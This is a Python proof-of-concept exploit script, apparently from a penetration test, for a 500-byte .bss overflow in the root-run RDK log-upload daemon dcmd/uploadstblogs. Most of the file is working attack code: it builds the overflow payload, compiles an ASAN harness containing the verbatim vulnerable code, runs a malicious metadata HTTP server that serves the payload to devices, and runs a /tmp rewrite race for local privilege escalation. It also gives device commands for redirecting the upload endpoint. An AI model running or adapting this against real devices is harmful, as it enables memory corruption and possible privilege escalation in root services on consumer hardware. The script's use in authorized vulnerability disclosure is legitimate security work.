#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# =============================================================================
#  DCM-007  —  Static-buffer overflow in attempt_proxy_fallback()
#  Target   :  dcmd / libuploadstblogs (runs as root, umask(0))
#  File     :  uploadstblogs/src/path_handler.c  lines 261-311
#  CWE      :  CWE-787 (Out-of-bounds Write)
#  Author   :  Authorized penetration test — PoC only, non-destructive
# =============================================================================
#
#  ROOT CAUSE
#  ----------
#  attempt_proxy_fallback() does:
#
#      char s3_url[1024] = {0};
#      ...
#      fgets(s3_url, sizeof(s3_url), result_file);   // <= 1023 attacker bytes
#      ...
#      char* bucket_start = https_pos + 8;            // skip "https://"
#      char* path_start   = strchr(bucket_start, '/');
#      char* query_start  = strchr(bucket_start, '?');
#      ...
#      } else if (query_start && path_start && query_start > path_start) {
#          size_t path_len = query_start - path_start;   // *** UNBOUNDED ***
#          static char clean_path[512];                   // .bss, 512 bytes
#          strncpy(clean_path, path_start, path_len);     // OOB WRITE
#          clean_path[path_len] = '\0';                   // OOB NUL
#          path_part = clean_path;
#      }
#
#  No check that path_len < sizeof(clean_path).  The attacker controls the
#  contents of /tmp/httpresults.txt (it is the raw HTTP body returned by the
#  log-upload metadata server, written by performMetadataPostWithCertRotationEx
#  with curl -o, and the file is world-writable because dcmd runs umask(0)).
#
#  OFFSET / SIZE MATH
#  ------------------
#      fgets() max read .......................... 1023 bytes (+ NUL)
#      Crafted line (no trailing '\n'):
#         "https://"            8 bytes
#         "h"                   1 byte    (dummy bucket host)
#         "/"                   1 byte    (path_start points HERE)
#         "A" * 511           511 bytes   (fills clean_path[1..511] in-bounds)
#         "DCM7" * 125        500 bytes   (OVERFLOWS clean_path[512..1011])
#         "?x"                  2 bytes   (query_start -> forces vulnerable branch)
#                            ----------
#                              1023 bytes  == sizeof(s3_url)-1  (max fgets payload)
#
#      path_len  = query_start - path_start
#                = 1 (the '/') + 511 + 500
#                = 1012
#
#      sizeof(clean_path) = 512
#      OVERFLOW           = 1012 - 512 = 500 attacker-controlled bytes into .bss
#      + 1 out-of-bounds NUL write at clean_path[1012]
#
#  PRECONDITIONS ON DEVICE (for the daemon to reach attempt_proxy_fallback):
#      - /etc/device.properties contains  DEVICE_TYPE=mediaclient
#      - /etc/device.properties contains  PROXY_BUCKET=<anything non-empty>
#      - The Stage-2 S3 PUT fails (verify_upload() != SUCCESS)
#        -> guaranteed here: host "h" does not resolve, OR we force
#           /tmp/logupload_curl_info to a non-200 code in --mode local.
#
#  THREE OPERATING MODES
#  ---------------------
#   --mode demo    (DEFAULT, runs anywhere with gcc)
#        Writes the payload to /tmp/httpresults.txt, emits a tiny C harness
#        containing the *verbatim* vulnerable parsing block, compiles it with
#        AddressSanitizer, runs it.  ASAN reports:
#            "global-buffer-overflow ... clean_path"
#        proving the 500-byte .bss overflow with the recognisable 0x374D4344
#        ("DCM7") pattern.  Creates /tmp/PWNED_DCM-007 on success.
#
#   --mode server  (network attack vector — malicious metadata server)
#        Stand up a stdlib HTTP server that answers ANY request with the
#        1023-byte overflow URL as the body.  Point the device's
#        TR-181 LogUploadSettings.UploadRepository:URL (or upload_http_link)
#        at  http://<this-host>:<port>/ .  When uploadstblogs runs:
#          Stage-1 POST -> body saved to /tmp/httpresults.txt (the payload)
#          Stage-2 PUT to https://h/...  -> curl fails (host unknown)
#          -> attempt_proxy_fallback() re-reads /tmp/httpresults.txt -> OVERFLOW
#
#   --mode local   (local-privesc vector — /tmp race as unprivileged user)
#        Tight loop that keeps overwriting the world-writable
#        /tmp/httpresults.txt with the payload AND /tmp/logupload_curl_info
#        with "500" so verify_upload() fails and proxy fallback fires.
#        Run this while triggering a log upload (e.g. via rbus / cron) and
#        the root dcmd process will strncpy() 1012 bytes into clean_path[512].
#
#  This PoC is NON-DESTRUCTIVE: it only writes to /tmp, and the overflow
#  payload is an ASCII pattern ("AAAA.../DCM7DCM7...") to make crash dumps
#  trivially attributable to this finding.
# =============================================================================

import argparse
import http.server
import os
import socketserver
import subprocess
import sys
import tempfile
import textwrap
import threading
import time

# ---------------------------------------------------------------------------
# 1.  Build the overflow payload (single line, NO trailing newline so fgets()
#     consumes the full 1023 bytes).
# ---------------------------------------------------------------------------
HDR        = b"https://h"          # 9 bytes  ("https://" + 1-byte fake host)
PATH_SLASH = b"/"                   # 1 byte   -> path_start, copied to clean_path[0]
INBOUND    = b"A" * 511             # 511 bytes -> clean_path[1..511]  (still in-bounds)
OVERFLOW   = b"DCM7" * 125          # 500 bytes -> clean_path[512..1011]  *** OOB ***
QUERY      = b"?x"                  # 2 bytes  -> query_start (forces vulnerable branch)

PAYLOAD = HDR + PATH_SLASH + INBOUND + OVERFLOW + QUERY
assert len(PAYLOAD) == 1023, "payload must be exactly sizeof(s3_url)-1 == 1023"
# path_len that the C code will compute:
PATH_LEN = len(PATH_SLASH) + len(INBOUND) + len(OVERFLOW)   # = 1012
assert PATH_LEN == 1012

HTTPRESULTS      = "/tmp/httpresults.txt"          # session->strategy != STRAT_RRD
HTTPRESULTS_RRD  = "/tmp/rrd_httpresults.txt"      # session->strategy == STRAT_RRD
CURL_INFO        = "/tmp/logupload_curl_info"      # read by perform_s3_put_with_fallback()
PWNED_FLAG       = "/tmp/PWNED_DCM-007"


def write_payload_files():
    """Drop the malicious S3 URL into both possible result-file locations and
    force the S3-PUT verification to fail so attempt_proxy_fallback() runs."""
    for p in (HTTPRESULTS, HTTPRESULTS_RRD):
        with open(p, "wb") as f:
            f.write(PAYLOAD)            # NO newline -> fgets reads all 1023 bytes
        try:
            os.chmod(p, 0o666)
        except PermissionError:
            pass
    # Make perform_s3_put_with_fallback() see a non-200 HTTP code so
    # verify_upload() returns failure and the proxy-fallback branch is taken.
    with open(CURL_INFO, "w") as f:
        f.write("500\n")


# ---------------------------------------------------------------------------
# 2.  --mode demo : standalone reproduction with the *exact* vulnerable code
#     compiled under AddressSanitizer.  Runs on any Linux box with gcc.
# ---------------------------------------------------------------------------
HARNESS_C = textwrap.dedent(r'''
    /* DCM-007 standalone harness.
     * The block between // --- VULN START --- and // --- VULN END --- is taken
     * VERBATIM from uploadstblogs/src/path_handler.c:275-311
     * (attempt_proxy_fallback), only the surrounding ctx/session plumbing is
     * stubbed so it builds standalone.
     */
    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>

    /* Sentinel placed in .bss so that even WITHOUT ASAN you can see the
     * overflow clobber adjacent static storage with the "DCM7" pattern.
     * (Linker may reorder; ASAN is the authoritative detector.) */
    static char bss_sentinel[64] = {0};

    int main(void)
    {
        char s3_url[1024] = {0};
        char proxy_url[1024] = {0}; (void)proxy_url;

        FILE* result_file = fopen("/tmp/httpresults.txt", "r");
        if (!result_file || !fgets(s3_url, sizeof(s3_url), result_file)) {
            fprintf(stderr, "cannot read /tmp/httpresults.txt\n");
            if (result_file) fclose(result_file);
            return 1;
        }
        fclose(result_file);

        // --- VULN START --- (path_handler.c:275-311 verbatim) ---------------
        // Remove trailing newline
        char* newline = strchr(s3_url, '\n');
        if (newline) *newline = '\0';

        // Extract S3 bucket hostname: sed "s|.*https://||g" | cut -d "/" -f1
        char* https_pos = strstr(s3_url, "https://");
        if (!https_pos) {
            fprintf(stderr, "Invalid S3 URL format in httpresult.txt\n");
            return 1;
        }

        char* bucket_start = https_pos + 8; // Skip "https://"
        char* path_start = strchr(bucket_start, '/');
        char* query_start = strchr(bucket_start, '?');

        if (!path_start && !query_start) {
            fprintf(stderr, "No path component found in S3 URL\n");
            return 1;
        }

        // Build proxy URL: replace bucket with PROXY_BUCKET, keep path, remove query
        const char* path_part = path_start ? path_start : "";
        if (query_start && (!path_start || query_start < path_start)) {
            // Query comes before path, no path part
            path_part = "";
        } else if (query_start && path_start && query_start > path_start) {
            // Remove query parameters from path
            size_t path_len = query_start - path_start;
            static char clean_path[512];
            strncpy(clean_path, path_start, path_len);
            clean_path[path_len] = '\0';
            path_part = clean_path;
        }
        // --- VULN END -------------------------------------------------------

        fprintf(stderr,
                "[harness] path_part len=%zu (clean_path is 512 bytes)\n",
                strlen(path_part));
        fprintf(stderr,
                "[harness] bss_sentinel (should be all-zero, may now contain 'DCM7'): "
                "%02x %02x %02x %02x '%c%c%c%c'\n",
                (unsigned char)bss_sentinel[0], (unsigned char)bss_sentinel[1],
                (unsigned char)bss_sentinel[2], (unsigned char)bss_sentinel[3],
                bss_sentinel[0]?bss_sentinel[0]:'.', bss_sentinel[1]?bss_sentinel[1]:'.',
                bss_sentinel[2]?bss_sentinel[2]:'.', bss_sentinel[3]?bss_sentinel[3]:'.');
        fprintf(stderr, "[harness] EXPLOIT REACHED — if you see this without an "
                        "ASAN abort, the overflow silently corrupted .bss\n");
        return 0;
    }
''')


def mode_demo():
    print("[*] DCM-007 demo mode — proving the overflow offline with ASAN")
    print("[*] payload length          : %d bytes" % len(PAYLOAD))
    print("[*] computed path_len       : %d"        % PATH_LEN)
    print("[*] sizeof(clean_path)      : 512")
    print("[*] .bss overflow           : %d bytes (+1 OOB NUL)" % (PATH_LEN - 512))
    print()

    write_payload_files()
    print("[+] wrote malicious S3 URL to %s and %s" % (HTTPRESULTS, HTTPRESULTS_RRD))

    tmpdir = tempfile.mkdtemp(prefix="dcm007_")
    src    = os.path.join(tmpdir, "dcm007_harness.c")
    exe    = os.path.join(tmpdir, "dcm007_harness")
    with open(src, "w") as f:
        f.write(HARNESS_C)

    # Try ASAN first (authoritative), fall back to plain build if unavailable.
    cc_cmds = [
        ["gcc", "-g", "-O0", "-fno-stack-protector",
         "-fsanitize=address", "-o", exe, src],
        ["gcc", "-g", "-O0", "-fno-stack-protector", "-o", exe, src],
        ["cc",  "-g", "-O0", "-o", exe, src],
    ]
    built = False
    for cmd in cc_cmds:
        try:
            print("[*] compiling: %s" % " ".join(cmd))
            subprocess.check_call(cmd)
            built = True
            asan = "-fsanitize=address" in cmd
            break
        except (subprocess.CalledProcessError, FileNotFoundError):
            continue
    if not built:
        print("[-] no working C compiler found; payload files were still "
              "written to /tmp for on-device use.")
        return 1

    print("[*] running harness (expect ASAN 'global-buffer-overflow' on "
          "'clean_path', pattern 0x374d4344 = 'DCM7') ...")
    print("-" * 72)
    env = dict(os.environ)
    env["ASAN_OPTIONS"] = "detect_leaks=0:abort_on_error=0:exitcode=99"
    proc = subprocess.run([exe], env=env)
    print("-" * 72)
    rc = proc.returncode

    # Interpret result
    overflow_proven = False
    if asan and rc == 99:
        print("[+] AddressSanitizer caught the global-buffer-overflow in "
              "static char clean_path[512]  ==>  DCM-007 CONFIRMED")
        overflow_proven = True
    elif rc < 0:
        print("[+] harness terminated by signal %d (memory corruption) "
              "==> DCM-007 CONFIRMED" % (-rc))
        overflow_proven = True
    elif rc == 0:
        print("[!] harness completed; overflow occurred SILENTLY (no ASAN). "
              "Check the bss_sentinel line above for 'DCM7' bytes "
              "==> DCM-007 CONFIRMED (silent .bss corruption)")
        overflow_proven = True
    else:
        print("[?] harness exited rc=%d" % rc)

    if overflow_proven:
        with open(PWNED_FLAG, "w") as f:
            f.write("DCM-007 attempt_proxy_fallback() static char clean_path[512] "
                    "overflowed by %d bytes via /tmp/httpresults.txt\n"
                    "path_len=%d  pattern=DCM7 (0x374d4344)\n" %
                    (PATH_LEN - 512, PATH_LEN))
        print("[+] flag written: %s" % PWNED_FLAG)
    print("[*] artifacts left in %s" % tmpdir)
    return 0


# ---------------------------------------------------------------------------
# 3.  --mode server : malicious log-upload metadata server (network vector)
# ---------------------------------------------------------------------------
class EvilHandler(http.server.BaseHTTPRequestHandler):
    """Any request -> 200 OK with the 1023-byte overflow URL as the body.
    performMetadataPostWithCertRotationEx() writes this body verbatim to
    /tmp/httpresults.txt on the device.  The subsequent S3 PUT to host 'h'
    fails -> attempt_proxy_fallback() re-reads the file -> overflow."""

    def _reply(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(PAYLOAD)))
        self.end_headers()
        self.wfile.write(PAYLOAD)   # no newline
        sys.stderr.write("[evil-server] served %d-byte overflow URL to %s\n"
                         % (len(PAYLOAD), self.client_address[0]))

    def do_GET(self):  self._reply()
    def do_POST(self):
        # drain body so curl is happy
        n = int(self.headers.get("Content-Length", "0") or 0)
        if n: self.rfile.read(n)
        self._reply()
    def do_PUT(self):  self._reply()
    def log_message(self, fmt, *a): pass  # quiet


def mode_server(host, port):
    print("[*] DCM-007 malicious metadata server")
    print("[*] Listening on http://%s:%d/" % (host, port))
    print("[*] On the target RDK device, set the log-upload endpoint to this URL,")
    print("    e.g. via TR-181:")
    print('      rbuscli setv Device.X_RDKCENTRAL-COM_RFC.LogUploadEndpoint.URL '
          'string "http://%s:%d/cgi-bin/upload"' % (host, port))
    print("    (exact parameter name may differ per build — any URL that lands in")
    print("     ctx->endpoint_url / ctx->upload_http_link works)")
    print()
    print("[*] Required device config (/etc/device.properties — stock on Xi/mediaclient):")
    print("        DEVICE_TYPE=mediaclient")
    print("        PROXY_BUCKET=proxy.example.com")
    print()
    print("[*] When uploadstblogs runs:")
    print("      Stage-1 POST -> this server -> body saved to /tmp/httpresults.txt")
    print("      Stage-2 PUT  -> https://h/AAAA... -> curl fails (NXDOMAIN)")
    print("      -> attempt_proxy_fallback() -> strncpy 1012 bytes into clean_path[512]")
    print("      -> 500-byte .bss overflow in ROOT process  (pattern 'DCM7')")
    print()
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer((host, port), EvilHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] server stopped")


# ---------------------------------------------------------------------------
# 4.  --mode local : unprivileged /tmp race (local-privesc vector)
# ---------------------------------------------------------------------------
def mode_local(duration):
    print("[*] DCM-007 local /tmp race — run as an UNPRIVILEGED user on the device")
    print("[*] Continuously rewriting:")
    print("       %s   (overflow URL, 1023 bytes)" % HTTPRESULTS)
    print("       %s   (overflow URL, 1023 bytes)" % HTTPRESULTS_RRD)
    print("       %s   ('500' -> forces verify_upload() failure)" % CURL_INFO)
    print("[*] In another shell, trigger a log upload so dcmd enters")
    print("    perform_s3_put_with_fallback() -> attempt_proxy_fallback().")
    print("    Example trigger (device-dependent):")
    print('       rbuscli setv Device.X_RDKCENTRAL-COM_Logupload.UploadLogsNow bool true')
    print("       # or:  touch /tmp/.uploadlogs ; systemctl restart dcm-log-upload")
    print()
    print("[*] Window: attempt_proxy_fallback() RE-OPENS /tmp/httpresults.txt with")
    print("    fopen()/fgets() AFTER the (slow, network-bound) S3 PUT — wide race.")
    print()
    print("[*] Preconditions on device: DEVICE_TYPE=mediaclient and PROXY_BUCKET set")
    print("    in /etc/device.properties (standard on RDK-V Xi mediaclient builds).")
    print()

    stop = threading.Event()

    def hammer():
        n = 0
        while not stop.is_set():
            try:
                write_payload_files()
                n += 1
                if n % 2000 == 0:
                    sys.stderr.write("[local] %d rewrites\n" % n)
            except Exception as e:
                sys.stderr.write("[local] write error: %s\n" % e)
            # tiny sleep keeps CPU sane while still winning a multi-second
            # network-call window comfortably
            time.sleep(0.001)

    t = threading.Thread(target=hammer, daemon=True)
    t.start()
    try:
        if duration > 0:
            time.sleep(duration)
        else:
            while True:
                time.sleep(3600)
    except KeyboardInterrupt:
        pass
    stop.set()
    t.join(timeout=2)
    print("[*] local race stopped — check device for dcmd crash / dmesg / coredump")
    print("    Look for pattern 0x374d4344 ('DCM7') in the corrupted memory.")


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(
        description="DCM-007 PoC: static char clean_path[512] overflow in "
                    "attempt_proxy_fallback() via server-supplied S3 URL "
                    "(/tmp/httpresults.txt)")
    ap.add_argument("--mode", choices=["demo", "server", "local"], default="demo",
                    help="demo = offline ASAN proof (default); "
                         "server = malicious metadata HTTP server; "
                         "local = unprivileged /tmp race on-device")
    ap.add_argument("--host", default="0.0.0.0", help="server bind addr")
    ap.add_argument("--port", type=int, default=8780, help="server port")
    ap.add_argument("--duration", type=int, default=0,
                    help="local race duration in seconds (0 = until Ctrl-C)")
    ap.add_argument("--write-only", action="store_true",
                    help="just drop the payload into /tmp/httpresults.txt and exit")
    args = ap.parse_args()

    if args.write_only:
        write_payload_files()
        print("[+] wrote 1023-byte overflow URL to %s and %s" %
              (HTTPRESULTS, HTTPRESULTS_RRD))
        print("[+] wrote '500' to %s" % CURL_INFO)
        return 0

    if args.mode == "demo":
        return mode_demo()
    if args.mode == "server":
        return mode_server(args.host, args.port)
    if args.mode == "local":
        return mode_local(args.duration)


if __name__ == "__main__":
    sys.exit(main() or 0)

